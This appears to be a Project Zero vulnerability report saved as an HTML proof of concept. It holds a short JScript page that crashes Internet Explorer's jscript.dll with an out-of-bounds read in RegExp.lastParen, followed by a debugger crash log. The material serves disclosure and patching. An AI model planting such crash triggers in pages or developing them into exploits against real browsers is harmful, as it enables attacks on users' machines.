@@ -1,0 +1,91 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1382
+
+There is an out-of-bounds read in jscript.dll library (used in IE, WPAD and other places):
+
+PoC for IE (note: page heap might be required to obsorve the crash):
+
+=========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+
+function go() {
+  var r= new RegExp(Array(100).join('()'));
+  ''.search(r);
+  alert(RegExp.lastParen);
+}
+
+go();
+
+</script>
+
+<!--
+=========================================
+
+Debug log:
+
+=========================================
+
+(cec.a14): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+jscript!RegExpFncObj::LastParen+0x43:
+000007fe`f23d3813 4863accbac000000 movsxd  rbp,dword ptr [rbx+rcx*8+0ACh] ds:00000000`04770154=????????
+
+0:014> r
+rax=0000000000000063 rbx=000000000476fd90 rcx=0000000000000063
+rdx=0000000000000064 rsi=000000000476fd90 rdi=000007fef23d37d0
+rip=000007fef23d3813 rsp=00000000130f9090 rbp=00000000130f9148
+ r8=00000000130f9210  r9=0000000000000000 r10=000000000463fef0
+r11=000000000463ff38 r12=0000000000000083 r13=0000000000000000
+r14=00000000130f9210 r15=0000000000000000
+iopl=0         nv up ei pl nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+jscript!RegExpFncObj::LastParen+0x43:
+000007fe`f23d3813 4863accbac000000 movsxd  rbp,dword ptr [rbx+rcx*8+0ACh] ds:00000000`04770154=????????
+
+0:014> k
+ # Child-SP          RetAddr           Call Site
+00 00000000`130f9090 000007fe`f2385e6d jscript!RegExpFncObj::LastParen+0x43
+01 00000000`130f90e0 000007fe`f236b293 jscript!NameTbl::GetVal+0x3d5
+02 00000000`130f9170 000007fe`f2369d27 jscript!VAR::InvokeByName+0x873
+03 00000000`130f9380 000007fe`f2368ec2 jscript!CScriptRuntime::Run+0x373
+04 00000000`130fa180 000007fe`f23694b3 jscript!ScrFncObj::CallWithFrameOnStack+0x162
+05 00000000`130fa390 000007fe`f23686ea jscript!NameTbl::InvokeInternal+0x2d3
+06 00000000`130fa4b0 000007fe`f23624b8 jscript!VAR::InvokeByDispID+0xffffffff`ffffffea
+07 00000000`130fa500 000007fe`f2368ec2 jscript!CScriptRuntime::Run+0x5a6
+08 00000000`130fb300 000007fe`f2368d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162
+09 00000000`130fb510 000007fe`f2368b95 jscript!ScrFncObj::Call+0xb7
+0a 00000000`130fb5b0 000007fe`f236e6c0 jscript!CSession::Execute+0x19e
+0b 00000000`130fb680 000007fe`f23770e7 jscript!COleScript::ExecutePendingScripts+0x17a
+0c 00000000`130fb750 000007fe`f23768d6 jscript!COleScript::ParseScriptTextCore+0x267
+0d 00000000`130fb840 000007fe`e9a85251 jscript!COleScript::ParseScriptText+0x56
+0e 00000000`130fb8a0 000007fe`ea20b320 MSHTML!CActiveScriptHolder::ParseScriptText+0xc1
+0f 00000000`130fb920 000007fe`e9a86256 MSHTML!CScriptCollection::ParseScriptText+0x37f
+10 00000000`130fba00 000007fe`e9a85c8e MSHTML!CScriptData::CommitCode+0x3d9
+11 00000000`130fbbd0 000007fe`e9a85a11 MSHTML!CScriptData::Execute+0x283
+12 00000000`130fbc90 000007fe`ea2446fb MSHTML!CHtmScriptParseCtx::Execute+0x101
+13 00000000`130fbcd0 000007fe`e9b28a5b MSHTML!CHtmParseBase::Execute+0x235
+14 00000000`130fbd70 000007fe`e9a02e39 MSHTML!CHtmPost::Broadcast+0x90
+15 00000000`130fbdb0 000007fe`e9a5caef MSHTML!CHtmPost::Exec+0x4bb
+16 00000000`130fbfc0 000007fe`e9a5ca40 MSHTML!CHtmPost::Run+0x3f
+17 00000000`130fbff0 000007fe`e9a5da12 MSHTML!PostManExecute+0x70
+18 00000000`130fc070 000007fe`e9a60843 MSHTML!PostManResume+0xa1
+19 00000000`130fc0b0 000007fe`e9a46fc7 MSHTML!CHtmPost::OnDwnChanCallback+0x43
+1a 00000000`130fc100 000007fe`ea274f78 MSHTML!CDwnChan::OnMethodCall+0x41
+1b 00000000`130fc130 000007fe`e9969d75 MSHTML!GlobalWndOnMethodCall+0x240
+1c 00000000`130fc1d0 00000000`771f9bbd MSHTML!GlobalWndProc+0x150
+1d 00000000`130fc250 00000000`771f98c2 USER32!UserCallWinProcCheckWow+0x1ad
+1e 00000000`130fc310 000007fe`f2694a87 USER32!DispatchMessageWorker+0x3b5
+1f 00000000`130fc390 000007fe`f269babb IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+20 00000000`130ff610 000007fe`fe4c572f IEFRAME!LCIETab_ThreadProc+0x3a3
+21 00000000`130ff740 000007fe`f535925f iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f
+22 00000000`130ff770 00000000`772f59cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+23 00000000`130ff7c0 00000000`7742a561 kernel32!BaseThreadInitThunk+0xd
+24 00000000`130ff7f0 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
+
+=========================================
+-->
